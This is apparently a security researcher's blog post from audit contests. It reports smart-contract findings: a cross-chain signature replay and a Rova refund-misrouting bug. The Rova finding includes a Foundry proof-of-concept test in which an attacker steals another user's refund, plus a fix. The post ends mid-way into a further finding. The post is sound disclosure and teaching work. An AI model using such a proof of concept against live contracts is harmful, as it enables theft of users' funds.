<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Audit Contest - I (Code4rena, Cyfrin, Sherlock)" />
<meta name="author" content="anonymous" />
<meta property="og:locale" content="en" />
<meta name="description" content="Overview" />
<meta property="og:description" content="Overview" />
<link rel="canonical" href="http://localhost:4000/posts/Audit-Feb/" />
<meta property="og:url" content="http://localhost:4000/posts/Audit-Feb/" />
<meta property="og:site_name" content="Web3.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-02-19T00:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Audit Contest - I (Code4rena, Cyfrin, Sherlock)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"anonymous"},"dateModified":"2025-02-19T00:00:00+09:00","datePublished":"2025-02-19T00:00:00+09:00","description":"Overview","headline":"Audit Contest - I (Code4rena, Cyfrin, Sherlock)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Audit-Feb/"},"url":"http://localhost:4000/posts/Audit-Feb/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Audit Contest - I (Code4rena, Cyfrin, Sherlock) | Web3.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web3.0">
<meta name="application-name" content="Web3.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/eth.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web3.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Decentralize my life</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://etherscan.io/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Audit Contest - I (Code4rena, Cyfrin, Sherlock)</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Audit Contest - I (Code4rena, Cyfrin, Sherlock)</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739890800"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Feb 19, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                anonymous
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2236 words"
>
  <em>12 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h2 id="overview"><span class="me-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>Next Generation
    <ul>
      <li>Signature replayable across multiple chaines (Low) <a href="#">[link]</a></li>
    </ul>
  </li>
  <li>RAAC (soon)</li>
  <li>Gamma (soon)</li>
  <li>Rova Protocol (With PoC) // unfortunately, this is vulnerability but it’s very difficult to exploit, so it’s considered invalid…
    <ul>
      <li>Drain of funds in the Rova protocol due to refunds being sent to an incorret address (High) <a href="https://github.com/sherlock-audit/2025-02-rova-judging/issues/21">[link]</a></li>
      <li>Unauthorized Cancellation of another user’s participation (Medium) <a href="https://github.com/sherlock-audit/2025-02-rova-judging/issues/25">[link]</a></li>
      <li>Fairess disruption due to duplicate launch participation (Medium) <a href="https://github.com/sherlock-audit/2025-02-rova-judging/issues/8">[link]</a></li>
    </ul>
  </li>
  <li>DatingDapp (Frist Flights)
    <ul>
      <li>The deposit for liking someone is locked forever (High) <a href="#">[link]</a></li>
      <li>Reward is always set to 0, no reward can be received (High) <a href="#">[link]</a></li>
      <li>Due to fees not being collected, the service suffers financial losses (High) <a href="#">[link]</a></li>
    </ul>
  </li>
</ul>

<hr />
<h1 id="next-generation">Next generation</h1>
<h2 id="ngl-01-signature-replayable-across-multiple-chaines"><span class="me-2">[NG/L-01] Signature replayable across multiple chaines</span><a href="#ngl-01-signature-replayable-across-multiple-chaines" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="root-cause"><span class="me-2">Root Cause</span><a href="#root-cause" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nf">_verifySig</span><span class="p">(</span>
        <span class="nx">ForwardRequest</span> <span class="nx">memory</span> <span class="nx">req</span><span class="p">,</span>
        <span class="nx">bytes32</span> <span class="nx">domainSeparator</span><span class="p">,</span>
        <span class="nx">bytes32</span> <span class="nx">requestTypeHash</span><span class="p">,</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">suffixData</span><span class="p">,</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">sig</span>
    <span class="p">)</span> <span class="nx">internal</span> <span class="nx">view</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">typeHashes</span><span class="p">[</span><span class="nx">requestTypeHash</span><span class="p">],</span> <span class="dl">"</span><span class="s2">NGEUR Forwarder: invalid request typehash</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">bytes32</span> <span class="nx">digest</span> <span class="o">=</span> <span class="nf">keccak256</span><span class="p">(</span>
            <span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="dl">"</span><span class="se">\</span><span class="s2">x19</span><span class="se">\</span><span class="s2">x01</span><span class="dl">"</span><span class="p">,</span> <span class="nx">domainSeparator</span><span class="p">,</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nf">_getEncoded</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">requestTypeHash</span><span class="p">,</span> <span class="nx">suffixData</span><span class="p">)))</span>
        <span class="p">);</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">digest</span><span class="p">.</span><span class="nf">recover</span><span class="p">(</span><span class="nx">sig</span><span class="p">)</span> <span class="o">==</span> <span class="nx">req</span><span class="p">.</span><span class="k">from</span><span class="p">,</span> <span class="dl">"</span><span class="s2">NGEUR Forwarder: signature mismatch</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the contract does not enforce block.chainid in signature verification, making the same signature replayable across multiple chains (Ethereum,Polygon)</p>

<hr />
<h1 id="raac-soon">RAAC (Soon)</h1>

<hr />
<h1 id="gamma-soon">Gamma (Soon)</h1>

<hr />
<h1 id="rova-protocol">Rova Protocol</h1>
<h2 id="rovah-01-drain-of-users-funds-in-the-rova-protocol-due-to-refunds-being-sent-to-an-incorrect-address"><span class="me-2">[Rova/H-01] Drain of user’s funds in the Rova protocol due to refunds being sent to an incorrect address</span><a href="#rovah-01-drain-of-users-funds-in-the-rova-protocol-due-to-refunds-being-sent-to-an-incorrect-address" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h3 id="root-cause-1"><span class="me-2">Root Cause</span><a href="#root-cause-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>        <span class="k">if </span><span class="p">(</span><span class="nx">prevInfo</span><span class="p">.</span><span class="nx">currencyAmount</span> <span class="o">&gt;</span> <span class="nx">newCurrencyAmount</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Calculate refund amount</span>
            <span class="nx">uint256</span> <span class="nx">refundCurrencyAmount</span> <span class="o">=</span> <span class="nx">prevInfo</span><span class="p">.</span><span class="nx">currencyAmount</span> <span class="o">-</span> <span class="nx">newCurrencyAmount</span><span class="p">;</span>
            <span class="c1">// Validate user new requested token amount is greater than min token amount per user</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">userTokenAmount</span> <span class="o">-</span> <span class="nx">refundCurrencyAmount</span> <span class="o">&lt;</span> <span class="nx">settings</span><span class="p">.</span><span class="nx">minTokenAmountPerUser</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">revert</span> <span class="nc">MinUserTokenAllocationNotReached</span><span class="p">(</span>
                    <span class="nx">request</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span> <span class="nx">userTokenAmount</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">tokenAmount</span>
                <span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// Update total tokens requested for user for launch group</span>
            <span class="nx">userTokens</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">userId</span><span class="p">,</span> <span class="nx">userTokenAmount</span> <span class="o">-</span> <span class="nx">refundCurrencyAmount</span><span class="p">);</span>
            <span class="c1">// Transfer payment currency from contract to user</span>
            <span class="nc">IERC20</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">currency</span><span class="p">).</span><span class="nf">safeTransfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">refundCurrencyAmount</span><span class="p">);</span>
<span class="c1">// https://github.com/sherlock-audit/2025-02-rova-loptusKR/blob/main/rova-contracts/src/Launch.sol#L351L363</span>
</pre></td></tr></tbody></table></code></div></div>
<p>after a user participates in a sale, they can update the amount of tokens requested using the updateParticipation() function. if the updated amount is greater than the previous amount, the user must pay the difference; however, if it is lower, they are not required to pay extra, but instead receive a refund for the difference. The problem is that when refunding the difference, the recipient’s address is not managed correctly, which could allow someone else to steal the refund amount</p>

<p>in the refund transfer section, funds are sent to msg.sender instead of prevInfo.userAddress. therefore, if an attacker uses another user’s LaunchParticipationId, they could steal the refund amount associated with that LaunchParticipationId</p>

<h3 id="poc"><span class="me-2">PoC</span><a href="#poc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: GPL-3.0-only</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">22</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">IERC20Errors</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@openzeppelin/contracts/interfaces/draft-IERC6093.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">PausableUpgradeable</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">LaunchTestBase</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">./LaunchTestBase.t.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Launch</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Launch.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span>
    <span class="nx">LaunchGroupSettings</span><span class="p">,</span>
    <span class="nx">LaunchGroupStatus</span><span class="p">,</span>
    <span class="nx">ParticipationRequest</span><span class="p">,</span>
    <span class="nx">UpdateParticipationRequest</span><span class="p">,</span>
    <span class="nx">ParticipationInfo</span><span class="p">,</span>
    <span class="nx">CurrencyConfig</span>
<span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Types.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">LaunchUpdateParticipationTest</span> <span class="nx">is</span> <span class="nx">Test</span><span class="p">,</span> <span class="nx">Launch</span><span class="p">,</span> <span class="nx">LaunchTestBase</span> <span class="p">{</span>
    <span class="nx">LaunchGroupSettings</span> <span class="kr">public</span> <span class="nx">settings</span><span class="p">;</span>
    <span class="nx">ParticipationRequest</span> <span class="kr">public</span> <span class="nx">originalParticipationRequest</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nf">_setUpLaunch</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">test_exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="c1">// Setup initial participation</span>
        <span class="nx">settings</span> <span class="o">=</span> <span class="nf">_setupLaunchGroup</span><span class="p">();</span>
        <span class="c1">// victim's request</span>
        <span class="nx">originalParticipationRequest</span> <span class="o">=</span> <span class="nf">_createParticipationRequest</span><span class="p">();</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">signature</span> <span class="o">=</span> <span class="nf">_signRequest</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">originalParticipationRequest</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">victim's balance before ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">currency</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">user1</span><span class="p">));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startPrank</span><span class="p">(</span><span class="nx">user1</span><span class="p">);</span>
        <span class="nx">currency</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span>
            <span class="nf">address</span><span class="p">(</span><span class="nx">launch</span><span class="p">),</span>
            <span class="nf">_getCurrencyAmount</span><span class="p">(</span>
                <span class="nx">originalParticipationRequest</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span>
                <span class="nx">originalParticipationRequest</span><span class="p">.</span><span class="nx">currency</span><span class="p">,</span>
                <span class="nx">originalParticipationRequest</span><span class="p">.</span><span class="nx">tokenAmount</span>
            <span class="p">)</span>
        <span class="p">);</span>
        <span class="nx">launch</span><span class="p">.</span><span class="nf">participate</span><span class="p">(</span><span class="nx">originalParticipationRequest</span><span class="p">,</span> <span class="nx">signature</span><span class="p">);</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopPrank</span><span class="p">();</span>

        <span class="c1">// attacker's request</span>
        <span class="nx">UpdateParticipationRequest</span> <span class="nx">memory</span> <span class="nx">updateRequest</span> <span class="o">=</span> <span class="nf">_createUpdateParticipationRequest</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">updateSignature</span> <span class="o">=</span> <span class="nf">_signRequest</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">updateRequest</span><span class="p">));</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">startPrank</span><span class="p">(</span><span class="nx">user2</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">attacker's balance before ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">currency</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">user2</span><span class="p">));</span>
        <span class="nx">uint256</span> <span class="nx">updatedCurrencyAmount</span> <span class="o">=</span>
            <span class="nf">_getCurrencyAmount</span><span class="p">(</span><span class="nx">updateRequest</span><span class="p">.</span><span class="nx">launchGroupId</span><span class="p">,</span> <span class="nx">updateRequest</span><span class="p">.</span><span class="nx">currency</span><span class="p">,</span> <span class="nx">updateRequest</span><span class="p">.</span><span class="nx">tokenAmount</span><span class="p">);</span>
        <span class="nx">currency</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">launch</span><span class="p">),</span> <span class="nx">updatedCurrencyAmount</span><span class="p">);</span>

        <span class="c1">// Update participation</span>
        <span class="nx">launch</span><span class="p">.</span><span class="nf">updateParticipation</span><span class="p">(</span><span class="nx">updateRequest</span><span class="p">,</span> <span class="nx">updateSignature</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">victim's balance after ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">currency</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">user1</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">attacker's balance after ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">currency</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">user2</span><span class="p">));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopPrank</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">_createUpdateParticipationRequest</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">newTokenAmount</span><span class="p">)</span>
        <span class="nx">internal</span>
        <span class="nx">view</span>
        <span class="nf">returns </span><span class="p">(</span><span class="nx">UpdateParticipationRequest</span> <span class="nx">memory</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nx">uint256</span> <span class="nx">launchTokenDecimals</span> <span class="o">=</span> <span class="nx">launch</span><span class="p">.</span><span class="nf">tokenDecimals</span><span class="p">();</span>
        <span class="k">return</span> <span class="nc">UpdateParticipationRequest</span><span class="p">({</span>
            <span class="na">chainId</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">chainid</span><span class="p">,</span>
            <span class="na">launchId</span><span class="p">:</span> <span class="nx">testLaunchId</span><span class="p">,</span>
            <span class="na">launchGroupId</span><span class="p">:</span> <span class="nx">testLaunchGroupId</span><span class="p">,</span>
            <span class="na">prevLaunchParticipationId</span><span class="p">:</span> <span class="nx">testLaunchParticipationId</span><span class="p">,</span>
            <span class="na">newLaunchParticipationId</span><span class="p">:</span> <span class="dl">"</span><span class="s2">newLaunchParticipationId</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">userId</span><span class="p">:</span> <span class="nx">testUserId</span><span class="p">,</span>
            <span class="na">userAddress</span><span class="p">:</span> <span class="nx">user2</span><span class="p">,</span>
            <span class="na">tokenAmount</span><span class="p">:</span> <span class="nx">newTokenAmount</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="nx">launchTokenDecimals</span><span class="p">,</span>
            <span class="na">currency</span><span class="p">:</span> <span class="nf">address</span><span class="p">(</span><span class="nx">currency</span><span class="p">),</span>
            <span class="na">requestExpiresAt</span><span class="p">:</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">+</span> <span class="mi">1</span> <span class="nx">hours</span>
        <span class="p">});</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/2025/audit-feb/rova-drain.png" class="popup img-link  shimmer"><img src="/assets/img/2025/audit-feb/rova-drain.png" alt="" loading="lazy"></a></p>

<p>this is proof that user2 stole user1’s refund</p>

<h3 id="mitigation"><span class="me-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-diff highlighter-rouge"><div class="code-header">
        <span data-label-text="Diff"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>        if (prevInfo.currencyAmount &gt; newCurrencyAmount) {
            // Calculate refund amount
            uint256 refundCurrencyAmount = prevInfo.currencyAmount - newCurrencyAmount;
            // Validate user new requested token amount is greater than min token amount per user
            if (userTokenAmount - refundCurrencyAmount &lt; settings.minTokenAmountPerUser) {
                revert MinUserTokenAllocationNotReached(
                    request.launchGroupId, request.userId, userTokenAmount, request.tokenAmount
                );
            }
            // Update total tokens requested for user for launch group
            userTokens.set(request.userId, userTokenAmount - refundCurrencyAmount);
            // Transfer payment currency from contract to user
<span class="gd">-          IERC20(request.currency).safeTransfer(msg.sender, refundCurrencyAmount);
</span><span class="gi">+          IERC20(request.currency).safeTransfer(prevInfo.userAddress, refundCurrencyAmount);
</span></pre></td></tr></tbody></table></code></div></div>
<p>modify it so that the refund address is retrieved from previnfo as shown above</p>

<h2 id="rovam-01-unauthorized-cancellation-of-another-users-participation"><span class="me-2">[Rova/M-01] Unauthorized Cancellation of another user’s participation</span><a href="#rovam-01-unauthorized-cancellation-of-another-users-participation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="root-cause-2"><span class="me-2">Root Cause</span><a href="#root-cause-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
